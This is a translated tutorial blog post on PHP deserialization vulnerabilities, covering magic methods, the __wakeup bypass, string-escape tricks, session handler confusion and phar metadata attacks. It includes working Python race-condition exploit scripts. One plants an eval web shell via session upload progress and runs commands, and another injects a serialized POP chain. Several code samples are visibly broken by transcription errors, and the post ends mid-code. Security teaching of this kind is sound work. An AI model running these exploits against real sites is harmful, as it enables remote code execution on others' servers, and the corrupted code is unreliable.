# PHP Security Learning—Deserialization Vulnerability

Author: H3rmesk1t

Data: 2021.05.23

# Serialization and deserialization
## Definition

Serialization (serialization): is the process of converting variables into strings that can be saved or transferred;
Deserialization (reserialization): It is to convert this string into the original variable and use it at appropriate times;
These two processes combine to easily store and transfer data, making the program more maintainable;
The common methods of php serialization and deserialization are: serialize, unserialize

![Insert the picture description here](https://img-blog.csdnimg.cn/2021052111315244.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
![Insert the picture description here](https://img-blog.csdnimg.cn/20210521113202783.png#pic_center)

## Common usage situations

serialize and unserialize functions

```php
<?php
class Dino{
	public $name = 'H3rmesk1t';
	public $way = 'Web_Misc_Crypto';
}
$a = new Dino();
$a = serialize($a);
print_r($a);

$H3rmesk1t = array('a' ='Apple', 'b' ='Banana', 'c' ='Cocount');
$m = serialize($H3rmesk1t);
echo $m;
$n = unserialize($m);
print_r($n);
?>
```

```php
[1]Output:
O:4:"Dino":2:{s:4:"name";s:9:"H3rmesk1t";s:3:"way";s:15:"Web_Misc_Crypto";}
a:3:{s:1:"a";s:5:"Apple";s:1:"b";s:6:"Banana";s:1:"c";s:7:"Cocount";}
Array
(
    [a] =Apple
    [b] =Banana
    [c] =Cocount
)

[2] Explanation:
O: Object
4: Object length
Dino: object name
2: Number of attributes
s: string
9: The name length of this attribute
name: The attribute name
H3rmesk1t: The value of this property
...

a: array
3: Three attributes
s: string
1: Length
...

[3] Supplement:
Note: When the access control modifiers (public, protected, private) are different, the serialized results are also different.
When public is serialized, the attribute name will not be changed
When protected is serialized, the attribute name will become %00*%00 attribute name
When private is serialized, the attribute name will become %00 class name%00 attribute name
```

# Common serialization formats

 1. Binary format
 2. Byte array
3. json string
4. xml string

# Common magic methods in deserialization

1. __construct(), the constructor of the class
>2. __destruct(), class destructor
>3. __call(), called when an inaccessible method is called in the object
>4. __callStatic(), called when an inaccessible method is called in static mode
>5. __get(), called when obtaining a member variable of a class
>6. __set(), called when setting a member variable of a class
>7. __isset(), called when isset() or empty() is called for inaccessible properties
>8. __unset(), called when unset() is called for inaccessible properties
>9. __sleep(), when executing serialize(), this function will be called first
>10. __wakeup(), when executing unserialize(), this function will be called first
>11. __toString(), the response method of the class when it is treated as a string
>12. __invoke(), the response method when calling an object by calling a function
>13. __set_state(), when var_export() is called to export the class, this static method will be called
>14. __clone(), called when object copying is completed
>15. __autoload(), attempt to load an undefined class
>16. __debugInfo(), print the required debugging information

>
[Detailed explanation of magic methods](https://segmentfault.com/a/1190000007250604)

# Deserialization bypass
## protected and private bypass
![Insert the picture description here](https://img-blog.csdnimg.cn/20210521131914506.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

If the variable is preceded, it is the form of class name \x00*\x00
If the variable is preceded by private, it is the form of \x00 class name\x00


Bypass:
①: php7.1+ deserialization is not sensitive to class attributes, change protected to public
②: Manually change the serialized form to the standard form of protected or private, and combine urlencode and base64 encoding for operation

## __wakeup bypass (CVE-2016-7124)

Utilization version:
PHP5 < 5.6.25, ​ PHP7 < 7.0.10
principle:
When the value representing the number of object attributes in the serialized string is greater than the real number of attributes, the execution of __wakeup will be skipped
Example:
`O:4:"Dino":1:{s:1:"a";s:4:"misc";}` is changed to `O:4:"Dino":2:{s:1:"a";s:4:"misc";}`

## Quote
![Insert the picture description here](https://img-blog.csdnimg.cn/20210521134837837.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

The value of \$a can be equal to the value of \$b
## Use hexadecimal to bypass character filtering
![Insert the picture description here](https://img-blog.csdnimg.cn/20210521140820360.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
Serialization result: `O:4:"Dino":1:{s:3:"way";s:3:"web";}` contains character web, but after changing s to S, `O:4:"Dino":1:{S:3:"\\77ay";s:3:"web";}` uses hexadecimal system to bypass character filtering detection

## Utilization of the same name method

Sample source code

![Insert the picture description here](https://img-blog.csdnimg.cn/20210521145026158.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

POP Chain

![Insert the picture description here](https://img-blog.csdnimg.cn/20210521144346955.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

POP chain utilization

![Insert the picture description here](https://img-blog.csdnimg.cn/20210521145054751.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
## Bypass some regularities

preg_match('/^O:\d+/') matches whether the serialized string is the beginning of the object string.

 - Use the plus sign to bypass (note that when passing parameters in the url + it must be encoded as %2B)
- serialize(array(a)); a is
The object to be deserialized (the serialization result starts with a, which does not affect the destruction of $a as an array element)

```php
preg_match('/[oc]:\d+:/i', $var)

O:4:"Demo":1:{s:10:"Demofile";s:16:"f15g_1s_here.php";}
O:+4:"Demo":1:{s:10:"Demofile";s:16:"f15g_1s_here.php";}

unserialize('a:1:{i:0;O:4:"test":1:{s:1:"a";s:3:"abc";}}');
```
## Character escape

When deserializing PHP, the underlying code is separated by ; as the field, ending with } (except strings), and the content is judged based on the length. At the same time, the deserialization process must strictly follow the serialization rules to successfully implement deserialization. When the length of the serialization does not correspond, an error will occur.
The essence of character escape is actually closed, but it is divided into two situations: one is that more characters become more, and the other is that fewer characters become less.

### Increase characters
- Normal

```php
<?php
function up($str){
    return str_replace("x","xx",$str);
}
class D1no{
    public $name = 'H3rmesk1t';
    public $way = 'Web_Crypto_Misc';
}

echo serialize(new D1no())."\n";
echo "Before filtering","\n";
$c = unserialize((serialize(new D1no())));
print_r($c)."\n";
echo "Filtered"."\n";
$c = unserialize(up(serialize(new D1no())));
print_r($c);
?>
=>
O:4:"D1no":2:{s:4:"name";s:9:"H3rmesk1t";s:3:"way";s:15:"Web_Crypto_Misc";}
Before filtering
D1no Object
(
    [name] =H3rmesk1t
    [way] =Web_Crypto_Misc
)
After filtering
D1no Object
(
    [name] =H3rmesk1t
    [way] =Web_Crypto_Misc
)
```

- Passing in more than one x on the parameter name causes overflow and causes deserialization failure

```php
<?php
function up($str){
    return str_replace("x","xx",$str);
}
class D1no{
    public $name = 'H3rmesk1tx';
    public $way = 'Web_Crypto_Misc';
}

echo serialize(new D1no())."\n";
echo "Before filtering","\n";
$c = unserialize((serialize(new D1no())));
print_r($c)."\n";
echo "Filtered"."\n";
$c = unserialize(up(serialize(new D1no())));
print_r($c);
?>
=>
O:4:"D1no":2:{s:4:"name";s:10:"H3rmesk1tx";s:3:"way";s:15:"Web_Crypto_Misc";}
Before filtering
D1no Object
(
    [name] =H3rmesk1tx
    [way] =Web_Crypto_Misc
)
After filtering
```

- String escape implementation
Set the value of name to `H3rmesk1txxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx";s:4:"door";s:7:"Hacker!";}`, `";s:4:"door";s:7:"Hacker!";}` section has a total of 28 characters. Since the up function we defined replaces one `x` with two `xx`, 28 in the name parameter `x` will be replaced with 56 `x`, and the additional 28 `x` replaces the name parameter `";s:4:"door";s:7:"Hacker!";}`, so `s:4:"door";s:7:"Hacker!";}` can overflow, `"` closes the previous string, so that the string we filled in successfully escapes and performs deserialization operation, and the parameter way is replaced with `Hacker!`

```php
<?php
function up($str){
    return str_replace("x","xx",$str);
}
class D1no{
    public $name = 'H3rmesk1txxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx";s:3:"way";s:7:"Hacker!";}';
    public $way = 'Web_Crypto_Misc';
}

echo serialize(new D1no())."\n";
echo "Before filtering","\n";
$c = unserialize((serialize(new D1no())));
print_r($c)."\n";
echo "Filtered"."\n";
$c = unserialize(up(serialize(new D1no())));
print_r($c);
?>
=>
O:4:"D1no":2:{s:4:"name";s:63:"H3rmesk1txxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx";s:3:"way";s:7:"Hacker!";}";s:3:"way";s:15:"Web_Crypto_Misc";}
Before filtering
D1no Object
(
    [name] =H3rmesk1txxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx";s:3:"way";s:7:"Hacker!";}
    [way] =Web_Crypto_Misc
)
After filtering
D1no Object
(
    [name] =H3rmesk1txxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
    [way] =Hacker!
)
```
### Character reduction

- Normal

```php
<?php
function down($str){
    return str_replace("xx","x",$str);
}
class D1no{
    public $name = 'H3rmesk1t';
    public $way = 'Web_Crypto_Misc';
}

echo serialize(new D1no())."\n";
echo "Before filtering","\n";
$c = unserialize((serialize(new D1no())));
print_r($c)."\n";
echo "Filtered"."\n";
$c = unserialize(down(serialize(new D1no())));
print_r($c);
?>
=>
O:4:"D1no":2:{s:4:"name";s:9:"H3rmesk1t";s:3:"way";s:15:"Web_Crypto_Misc";}
Before filtering
D1no Object
(
    [name] =H3rmesk1t
    [way] =Web_Crypto_Misc
)
After filtering
D1no Object
(
    [name] =H3rmesk1t
    [way] =Web_Crypto_Misc
)
```

- Passing one less x in the parameter name causes overflow and causes deserialization failure

```php
<?php
function down($str){
    return str_replace("xx","x",$str);
}
class D1no{
    public $name = 'H3rmesk1txx';
    public $way = 'Web_Crypto_Misc';
}

echo serialize(new D1no())."\n";
echo "Before filtering","\n";
$c = unserialize((serialize(new D1no())));
print_r($c)."\n";
echo "Filtered"."\n";
$c = unserialize(down(serialize(new D1no())));
print_r($c);
?>
=>
O:4:"D1no":2:{s:4:"name";s:11:"H3rmesk1txx";s:3:"way";s:15:"Web_Crypto_Misc";}
Before filtering
D1no Object
(
    [name] =H3rmesk1txx
    [way] =Web_Crypto_Misc
)
After filtering
```

- String escape implementation
Since `xx` will be replaced with `x`, the 66 `x` we output will become 33 `x`. Since `";s:3:"way";s:15:"Web_Crypto_Misc` has a total of 33 characters, so it will be eaten by the parameter name and treated as its attribute value. The malicious string we write `";s:3:"way";s:7:"Hacker!";}` can be parsed normally and performed deserialization operations.

```php
<?php
function up($str){
    return str_replace("xx
","x",$str);
}
class D1no{
    public $name = 'H3rmesk1txxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx';
    public $way = 'Web_Crypto_Misc";s:3:"way";s:7:"Hacker!";}';
}

echo serialize(new D1no())."\n";
echo "Before filtering","\n";
$c = unserialize((serialize(new D1no())));
print_r($c)."\n";
echo "Filtered"."\n";
$c = unserialize(up(serialize(new D1no())));
print_r($c);
?>
=>
O:4:"D1no":2:{s:4:"name";s:75:"H3rmesk1txxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx";s:3:"way";s:42:"Web_Crypto_Misc";s:3:"way";s:7:"Hacker!";}";}
Before filtering
D1no Object
(
    [name] =H3rmesk1txxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
    [way] =Web_Crypto_Misc";s:3:"way";s:7:"Hacker!";}
)
After filtering
D1no Object
(
    [name] =H3rmesk1txxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx";s:3:"way";s:42:"Web_Crypto_Misc
    [way] =Hacker!
)
```
## Object Injection

A vulnerability occurs when a user's request is not properly filtered before being passed to the deserialization function unserialize(). Because PHP allows object serialization, an attacker can submit a specific serialized string to an unserialize function with the vulnerability, which ultimately leads to an injection of any PHP object within the scope of the application.

Trigger the conditions that need to be met
- Unserialize parameters are controllable
- The code defines a class containing a magic method, and some functions with security problems appear in this method that use class member variables as parameters

```php
<?php
class D1no{
    var $name = "H3rmesk1t";
    function __destruct(){
        echo $this->name;
    }
}

$a = 'O:4:"D1no":1:{s:4:"name";s:4:"Gyan";}';
unserialize($a);
=>
Gyan
```

After the code is run, the _destruct function will be called, and the variable name output Gyan will be overwritten.

# session deserialization vulnerability
## session definition

The session in PHP mainly refers to the conversation between the client browser and the server data exchange. From the browser is opened to the close, it is the simplest session cycle.

## PHP session workflow

The workflow of the session is very simple. When a session starts, PHP will try to find the session ID from the request (usually through the session cookie). If you find that the session id does not exist in the requested cookie, Get, and Post, PHP will automatically call the php_session_create_id function to create a new session, and send it to the client to save in the http response through the set-cookie header. For example, log in to the following web pages Cokkie, Get, and Post, and do not have session ids, so the set-cookie header is used. Sometimes the browser user settings will prohibit cookies. When the client cookie is disabled, PHP can also automatically perform sessions. id is added to the url parameter and form's hidden field, but this requires the session.use_trans_sid in php.ini to be enabled, or ini_set can be called at runtime to set this configuration item

![Insert the picture description here](https://img-blog.csdnimg.cn/2021052422292324.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

After the session starts, PHP will set the data in the session to the $_SESSION variable. The following code is an example of registering a variable in the $_SESSION variable.

```php
<?php
session_start();
if (!isset($_SESSION['username'])) {
  $_SESSION['username'] = 'H3rmesk1t' ;
}
?>
```

The meaning of code is to create a session if there is no session
It can also be represented by the following flowchart

![Insert the picture description here](https://img-blog.csdnimg.cn/20210524223150931.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
## php.ini configuration

There are six relatively important configurations in php.ini
- session.save_path="" --Set the storage location of session
- session.save_handler="" --Set user-defined storage functions. If you want to use PHP's built-in session storage mechanism, you can use this function
- session.auto_start --Specifies whether the session module starts a session at the beginning of the request. The default value is 0 and does not start
- session.serialize_handler --Defines the processor name used to serialize/deserialize, and uses php by default
- session.upload_progress.enabled --Enable upload progress tracking and populate the $_SESSION variable, enabled by default
- session.upload_progress.cleanup -- After reading all POST data (i.e., uploading is completed), the progress information is immediately cleaned, and enabled by default


As in phpstudy, the above configuration is as follows:
- session.save_path = "/tmp" --All session files are stored in /tmp directory
- session.save_handler = files -- indicates that session is stored in the form of a file
- session.auto_start = 0 -- indicates that session is not started by default
- session.serialize_handler = php -- indicates that the default (de)serialization engine of session uses the php (de)serialization engine
- session.upload_progress.enabled on -- Indicates that upload progress traces are allowed and populated with $_SESSION variable
- session.upload_progress.cleanup on -- Indicates that all POST data (i.e., upload is completed), clean up the progress information ($_SESSION variable) immediately after all POST data (i.e., upload is completed).
## Storage mechanism of PHP session
The above mentioned that the storage mechanism of PHP session is defined by session.serialize_handler. It is stored in a file by default, and the stored files are determined by session_sessionid. Of course, this file name is not unchanged, and they are all in the form of session_sessionid.

![Insert the picture description here](https://img-blog.csdnimg.cn/20210524224100754.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

Open it and see what's serialized

![Insert the picture description here](https://img-blog.csdnimg.cn/20210524224120596.png#pic_center)
## session storage mechanism
PHP has built-in multiple processors for storing $_SESSION data, and the data will be serialized and deserialized. The following three commonly used ones are corresponding to three different processing formats:


![Insert the picture description here](https://img-blog.csdnimg.cn/20210524224427352.png#pic_center)
### php processor
First, let’s take a look at the serialization result when session.serialize_handler is equal to php. The code is as follows

```php
<?php
error_reporting(0);
ini_set('session.se
legize_handler','php');
session_start();
$_SESSION['session'] = $_GET['session'];
var_dump($_SESSION['session']);
?>
```
The sessionid of the session can actually be seen, which is `fvi0gt2da9juv5kb2h9djtkgqb`

![Insert the picture description here](https://img-blog.csdnimg.cn/20210524225443633.png#pic_center)
Let's go to the session storage directory to view the session file content

![Insert the picture description here](https://img-blog.csdnimg.cn/20210524225654722.png#pic_center)

session is the key name of $_SESSION['session'], and then it is the serialized value of the incoming GET parameter.

### php_binary processor

Let's take a look at the serialization result when session.serialize_handler is equal to php_binary

```php
<?php
error_reporting(0);
ini_set('session.serialize_handler','php_binary');
session_start();
$_SESSION['sessionsessionsession'] = $_GET['session'];
var_dump($_SESSION['sessionsessionsessionsession']);
?>
```

In order to more intuitively reflect the format difference, the key value length is set here to be 35, and the ASCII code corresponding to 35 is #, so the final result is as follows

![Insert the picture description here](https://img-blog.csdnimg.cn/20210524230346929.png#pic_center)

# is the value of ASCII corresponding to the length of the key name, sessionsessionsessionsessionsessionsessionsessions, s:7:"xianzhi"; is the value of the serialized incoming GET parameter
### php_serialize processor
Finally, the serialization result when session.serialize_handler is equal to php_serialize. The code is as follows

```php
<?php
error_reporting(0);
ini_set('session.serialize_handler','php_serialize');
session_start();
$_SESSION['session'] = $_GET['session'];
var_dump($_SESSION['session']);
?>
```
![Insert the picture description here](https://img-blog.csdnimg.cn/20210524230630515.png#pic_center)

a:1 means there is 1 element in the $_SESSION array, and the content in the curly braces is the serialized value of the incoming GET parameter.
## Use session.upload_progress to include the file
Conditions of utilization
- 1. There is a file containing vulnerability
- 2. Know the session file storage path, you can try the default path
- 3. Have permission to read and write session files

```php
Sample code

<?php
$b = $_GET['file'];
include "$b";
?>
```

It can be found that there is a file containing a vulnerability, but a malicious file that can be included cannot be found; in fact, we can use session.upload_progress to write malicious statements into the session file, thereby including the session file; the prerequisite is that we need to know the storage location of the session file.


analyze
>- **The code does not have session_start(), how to create session file: **
>In fact, if session.auto_start=On, PHP will automatically initialize the session when receiving the request, and no longer needs to execute session_start(); but by default, this option is turned off; but session also has a default option, session.use_strict_mode default value is 0; at this time, the user can define the Session ID by himself. For example, if we set PHPSESSID=TGAO in the cookie, PHP will create a file on the server: /tmp/sess_TGAO"; even if the user does not initialize the Session at this time, PHP will automatically initialize the Session; and generate a key value, which consists of ini.get("session.upload_progress.prefix") + session.upload_progress.name value constructed by us, and is finally written to the Sess_file.
- **Default configuration session.upload_progress.cleanup = on causes the session file to be cleared immediately after the file is uploaded. How to perform rce: **
At this time, we can use competition to include the content before the session file is cleared

```python
Utilize scripts

import io
import requests
import threading
sessid = 'TGAO'
data = {"cmd":"system('whoami');"}
def write(session):
    While True:
        f = io.BytesIO(b'a' * 1024 * 50)
        resp = session.post( 'http://192.168.43.236/H3rmesk1t/test.php', data={'PHP_SESSION_UPLOAD_PROGRESS': '<?php eval($_POST["cmd"]);?>'}, files={'file': ('tgao.txt',f)}, cookies={'PHPSESSID': session} )
def read(session):
    While True:
        resp = session.post('http://192.168.43.236/H3rmesk1t/test.php?file=session/sess_'+sessid,data=data)
        if 'tgao.txt' in resp.text:
            print(resp.text)
            event.clear()
            break
        else:
            print("[++++++++++++++]retry")
if __name__=="__main__":
    event=threading.Event()
    with requests.session() as session:
        for i in range(1,30):
            threading.Thread(target=write,args=(session,)).start()
        for i in range(1,30):
            threading.Thread(target=read,args=(session,)).start()
    event.set()
```
![Insert the picture description here](https://img-blog.csdnimg.cn/20210524232554536.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
## Use session.upload_progress to perform deserialization attack

The main use condition is the session deserialization vulnerability

```php
Sample code

<?php
error_reporting(0);
date_default_timezone_set("Asia/Shanghai");
ini_set('session.serialize_handler','php');
session_start();
class Door{
    public $handle;
​
    function __construct() {
        $this->handle=new TimeNow();
    }
​
    function __destruct() {
        $this->handle->action();
    }
}
class TimeNow {
    function action() {
        echo "Your visit time:".date('Y-m-d H:i:s',time());
    }
}
class IP{
    public $ip;
    function __construct() {
        $this->ip = 'echo $_SERVER["REMOTE_ADDR"];';
    }
    function
n action() {
        eval($this->ip);
    }
}
?>
```

analyze
- **The entire code has no controllable parameters. What methods can be used to deserialize and utilize it**:
Here, the file is uploaded using PHP_SESSION_UPLOAD_PROGRESS, where the file name is controllable, thereby constructing malicious serialization statements and writing session files; in addition, just like the file contains and utilizes, competition is also required.

```php
Constructing malicious serialization statements

<?php
ini_set('session.serialize_handler', 'php_serialize');
session_start();
class Door{
    public $handle;
​
    function __construct() {
        $this->handle = new IP();
    }
​
    function __destruct() {
        $this->handle->action();
    }
}
class TimeNow {
    function action() {
        echo "Your visit time:".date('Y-m-d H:i:s',time());
    }
}
​
class IP{
    public $ip;
    function __construct() {
        //$this->ip='payload';
        $this->ip='phpinfo();';
        //$this->ip='print_r(scandir('/'));';
    }
    function action() {
        eval($this->ip);
    }
}
$a=new Door();
$b=serialize($a);
$c=addslashes($b);
$d=str_replace("O:4:","|O:4:",$c);
echo $d;
?>
```

```python
Conditional competition

#coding=utf-8
import requests
import threading
import io
import sys
​
def exp(ip,port):
    
    f = io.BytesIO(b'a' * 1024 *1024*1)
    While True:
        et.wait()
        url = 'http://'+ip+':'+str(port)+'/test5.php'
        headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
        'DNT': '1',
        'Cookie': 'PHPSESSID=20190506',
        'Connection': 'close',
        'Upgrade-Insecure-Requests': '1'
        }
        proxy = {
        'http': '127.0.0.1:8080'
        }
        data={'PHP_SESSION_UPLOAD_PROGRESS':'123'}
        files={
            'file':(r'|O:4:\"Door\":1:{s:6:\"handle\";O:2:\"IP\":1:{s:2:\"ip\";s:10:\"phpinfo();\";}}',f,'text/plain')
        }
        resp = requests.post(url,headers=headers,data=data,files=files,proxies=proxy) #,proxies=proxy
        resp.encoding="utf-8"
        if len(resp.text)<2000:
            print('[++++]retry')
        else:
            print(resp.content.decode('utf-8').encode('utf-8'))
            et.clear()
            print('success!')
            
​
if __name__ == "__main__":
    ip=sys.argv[1]
    port=int(sys.argv[2])
    et=threading.Event()
    for i in range(1,40):
        threading.Thread(target=exp,args=(ip,port)).start()
    et.set()
​
```

Add a proxy to the code and use burpsuite to catch the package

![Insert the picture description here](https://img-blog.csdnimg.cn/20210524233252144.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
Here are a few notes:
- PHPSESSID must be, because it is necessary to compete for the same file
- filename is controllable, but add | at the front of the value, because the ultimate goal is to use the deserialization of session, PHP_SESSION_UPLOAD_PROGRESS is just a springboard; secondly, double quotes in the string are escaped to prevent conflicts with the outermost double quotes
- The uploaded file should be larger, otherwise it will be difficult to compete for success; write f = io.BytesIO(b'a' * 1024 *1024*1)
- An error occurs when Chinese characters appear in the filename value, so before using the script, you must modify the python source code

> Remove the proxy in exp.py and run exp.py directly. The effect is as follows

![Insert the picture description here](https://img-blog.csdnimg.cn/20210524233501242.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
## Use different engines to process session files

The serialization formats generated by the php processor and the php_serialize processor are not problematic in themselves, but if these two processors are mixed, it will cause harm. The principle of formation is that when the characters stored in session.serialize_handler = php_serialize can be introduced into | , and then the value of $_SESSION is taken out in session.serialize_handler = php format, | will be regarded as a key-value pair separator, which will cause deserialization vulnerabilities in specific places.
We create a session.php to transfer session value, the code inside is as follows

```php
<?php
error_reporting(0);
ini_set('session.serialize_handler','php_serialize');
session_start();
$_SESSION['session'] = $_GET['session'];
?>
```

Create another hello.php, the code in it is as follows

```php
<?php
  error_reporting(0);
  ini_set('session.serialize_handler','php');
  session_start();
    class D1no{
    public $name = 'H3rmesk1t';
    function __wakeup(){
      echo "Who are you?";
    }
    function __destruct(){
      echo '<br>'.$this->name;
    }
  }
  $str = new D1no();
?>
```

The function of these two files is very clear. The processor of the session.php file is php_serialize, the processor of the hello.php file is php, the function of the session.php file is to pass in a controlled session value, and the function of the hello.php file is to enter before deserialization begins
Who are you?, output name value when deserialization is finished
Run hello.php to see the effect

![Insert the picture description here](https://img-blog.csdnimg.cn/20210525002249153.png#pic_center)

Use the following code to reproduce the session's deserialization vulnerability

```php
<?php
    class D1no{
    public $name = 'Gyan';
    function __wakeup(){
      echo "Who are you?";
    }
    function __destruct(){
      echo '<br>'.$this->name;
    }
  }
  $str = new D1no();
  echo serialize($str);
?>
```
![Insert the picture description here](https://img-blog.csdnimg.cn/20210525002459521.png#pic_center)

Because session is a php_serialize processor, it is allowed to exist in a string, so prefix the serialized content of this code with | passed into session.php
Now let's take a look at the contents of the session file

![Insert the picture description here](https://img-blog.csdnimg.cn/2021052500275925.png#pic_center)

Check hello.php again

![Insert the picture description here](https://img-blog.csdnimg.cn/20210525002851662.png#pic_center)
# Phar Deserialization
## concept
A php application is often composed of multiple files. It is very convenient to distribute and run them in one file. There are many such columns, such as the installer on the window operating system, a jquery library, etc. In order to achieve this, php adopts the phar document file format. This concept originates from the JAR jar, but it is mainly designed for PHP's web environment. Unlike JAR archives, Phar archives can be processed by PHP itself, so there is no need to use additional tools to create or use, and you can create or extract it using php scripts. Phar is a synthetic word composed of PHP and Archive. It can be seen that it is the meaning of a php archive file (simplely speaking, phr is a php compressed document, which can be accessed and executed by php without decompression)
The phar file is essentially a compressed file that stores user-defined meta-data in serialized form; when the affected file operation function calls the phar file, the contents in the meta-data will be automatically deserialized.

Some common stream wrappers in php are as follows:
- file:// — access the local file system, use this wrapper by default when using file system functions
- http:// — Access HTTP(s) URL
- ftp:// — Access FTP(s) URLs
- php:// — access to individual input/output streams (I/O streams)
- zlib:// — Compressed Stream
- data:// — data (RFC 2397)
- glob:// — Find matching file path pattern
- phar:// — PHP Archive
- ssh2:// — Secure Shell 2
- rar:// — RAR
- ogg:// — Audio Streaming
- expect:// — Handle interactive streams

## The structure of the phar file

- stub: It is the file identifier of phar, in the format xxx<?php xxx; __HALT_COMPILER();?>;
- manifest: that is, meta-data, compressed file attributes and other information to serialize storage
- contents: the contents of the compressed file
- signature: Signature, placed at the end of the file

## Prerequisites

- Set to php.ini to phar.readonly=Off
 - php version>=5.3.0
- The phar file must be uploaded to the server
- Have magic methods available as a "springboard"
- The parameters of the file operation function are controllable, and special characters such as:/, phar are not filtered

## Phar deserialization vulnerability

Vulnerability causes: meta-data information stored in phar is stored in serialized manner. When the file operation function parses the phar file through the phar://pseudo protocol, the data will be deserialized.

## demo test

```php
<?php
    class D1no{
    }
    @unlink("phar.phar");
    $phar = new Phar("phar.phar"); //The suffix must be phar
    $phar->startBuffering();
    $phar->setStub("<?php __HALT_COMPILER(); ?>"); //Set stub
    $o = new D1no();
    $phar->setMetadata($o); //Save custom meta-data into manifest
    $phar->addFromString("test.txt", "test"); //Add the file to be compressed
    //Signature calculation automatically
    $phar->stopBuffering();
?>
```

It is obvious that manifest is stored in serialized form

![Insert the picture description here](https://img-blog.csdnimg.cn/20210525102502455.png#pic_center)

There will inevitably be deserialization operations when serialized data. Most of the file system functions of PHP will deserialize meta-data when parsing phar files through phar://pseudo protocol.
The affected functions are as follows, [Reference link](https://blog.zsxsoft.com/post/38)

![Insert the picture description here](https://img-blog.csdnimg.cn/20210525102616727.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

```php
//exif
exif_thumbnail
exif_imagetype
    
//gd
imageloadfont
imagecreatefrom*** series functions
    
//hash
    
hash_hmac_file
hash_file
hash_update_file
md5_file
sha1_file
    
// file/url
get_meta_tags
get_headers
    
//standard
getimagesize
getimagesizefromstring
    
// zip
$zip = new ZipArchive();
$res = $zip->open('c.zip');
$zip->extractTo('phar://test.phar/test');
// Bzip / Gzip When the environment restricts the phar cannot appear in the previous characters. You can use compress.bzip2:// and compress.zlib:// to bypass it
$z = 'compress.bzip2://phar:///home/sx/test.phar/test.txt';
$z = 'compress.zlib://phar:///home/sx/test.phar/test.txt';

//Combined with other protocols: (SUCTF)
//https://www.xctf.org.cn/library/details/17e9b70557d94b168c3e5d1e7d4ce78f475de26d/
//When the environment restricts the phar to not appear in the previous characters, it can also be used in conjunction with other protocols.
//php://filter/read=convert.base64-encode/resource=phar://phar.phar

//Postgres pgsqlCopyToFile and pg_trace can also be used, and the writing function of pg is required to enable.
<?php
	$pdo = new PDO(sprintf("pgsql:host=%s;dbname=%s;user=%s;password=%s", "127.0.0.1", "postgres", "sx", "123456"));
